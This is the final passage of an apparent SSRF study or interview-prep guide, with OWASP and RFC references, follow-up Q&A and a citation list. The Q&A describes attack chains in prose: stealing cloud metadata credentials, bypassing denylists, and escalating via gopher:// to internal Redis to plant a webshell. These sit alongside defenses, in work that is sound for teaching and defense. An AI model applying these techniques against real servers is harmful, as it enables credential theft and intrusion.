  - **§5.2.6 — verify that untrusted data supplied to a URL-fetch is validated/sanitized** to
    prevent SSRF.
  - **§12.6 — SSRF Protection Requirements:** the web/app server must not follow redirects to
    untrusted hosts and outbound requests must be restricted to allowlisted destinations.
- **OWASP WSTG — WSTG-INPV-19: Testing for Server-Side Request Forgery.** The authoritative test
  procedure (identify sinks, encoding bypasses, OOB confirmation).
- **OWASP Cheat Sheets** — SSRF Prevention and XXE Prevention (authoritative defense guidance).
- **RFCs for the numeric-range check:** RFC 1918 (private IPv4), RFC 3927 (link-local
  `169.254.0.0/16`), RFC 6598 (CGNAT `100.64.0.0/10`), RFC 4291 (IPv6 addressing, incl.
  IPv4-mapped `::ffff:0:0/96`), RFC 8305 (Happy Eyeballs dual-stack behavior).

---

## Common follow-up questions

- **"What is the highest-impact SSRF target and why?"** Cloud instance metadata
  (`169.254.169.254`) — it hands out temporary IAM credentials (IMDSv1 with one GET), leading
  to account compromise; this is the Capital One 2019 breach.
- **"Why isn't a denylist enough?"** Alternate IP encodings (decimal/octal/hex/IPv6-mapped),
  wildcard DNS (`nip.io`), DNS rebinding, redirects, and parser confusion all evade string
  matching. Validate the *resolved numeric IP* and prefer allowlists.
- **"You resolve the host and check it's public, then connect — safe?"** No — **DNS
  rebinding** (TOCTOU) changes the answer between check and connect. **Pin** the validated IP.
- **"How does SSRF escalate to RCE?"** `gopher://` (arbitrary bytes) into an unauthenticated
  internal Redis/FastCGI to write a cron job or webshell.
- **"How does IMDSv2 stop SSRF?"** It requires a `PUT` + custom token header (most fetchers
  can only GET), defaults to hop-limit 1, and rejects `PUT`s with `X-Forwarded-For`. It's
  defense in depth, not a fix for the SSRF itself.
- **"Blind SSRF — is it exploitable?"** Yes: out-of-band DNS/HTTP callbacks confirm it,
  timing/status oracles enable port scanning, and it can still hit state-changing internal
  GET endpoints.
- **"Difference between SSRF and CSRF?"** CSRF abuses the *victim's browser* to make requests
  with the victim's cookies; SSRF abuses the *server* to make requests from the server's
  network position. Different actor, different trust boundary.
- **"How does XXE relate?"** XXE can force an XML parser to fetch a `SYSTEM` URL — an SSRF/
  file-read delivery mechanism; disable DTDs and external entities.

## References

- OWASP Top 10 2021 — **A10:2021 Server-Side Request Forgery (SSRF)**:
  https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
- OWASP Cheat Sheet — **Server Side Request Forgery Prevention**:
  https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- OWASP Cheat Sheet — **XML External Entity (XXE) Prevention**:
  https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- OWASP Web Security Testing Guide (WSTG) — **Testing for SSRF**:
  https://owasp.org/www-project-web-security-testing-guide/
- AWS — **Use IMDSv2** / *Add defense in depth against SSRF with enhancements to the EC2
  Instance Metadata Service*:
  https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
  and https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/
- Orange Tsai — **A New Era of SSRF: Exploiting URL Parsers** (Black Hat / DEF CON 2017),
  the canonical URL-parser-confusion research.
- PortSwigger Web Security Academy — **SSRF**:
  https://portswigger.net/web-security/ssrf
- OWASP A05:2021 — **Security Misconfiguration** (includes XXE):
  https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
- IETF **RFC 3927** (IPv4 Link-Local `169.254.0.0/16`), **RFC 1918** (Private IPv4 ranges),
  **RFC 6598** (CGNAT `100.64.0.0/10`), **RFC 4291** (IPv6 addressing incl. IPv4-mapped
  `::ffff:0:0/96`), **RFC 8305** (Happy Eyeballs dual-stack connection racing).
- OWASP **ASVS v4** — **§12.6 SSRF Protection** and **§5.2.6 untrusted URL fetch**:
  https://owasp.org/www-project-application-security-verification-standard/
- OWASP WSTG — **WSTG-INPV-19: Testing for Server-Side Request Forgery**.
- **CVE-2021-26855** (ProxyLogon, Exchange pre-auth SSRF), chained with **CVE-2021-27065**;
  **CVE-2021-22214** (GitLab unauthenticated SSRF).
- GCP — **Storing and retrieving instance metadata** (`Metadata-Flavor: Google`,
  `computeMetadata/v1/`); Azure — **Instance Metadata Service** (`Metadata: true`,
  `api-version`, `X-Forwarded-For` rejection).
- PortSwigger — **Cracking the Lens** (client-side exploitation of a server's HTTP stack) and
  **SSRF hidden attack surface** (Referer/Host vectors).
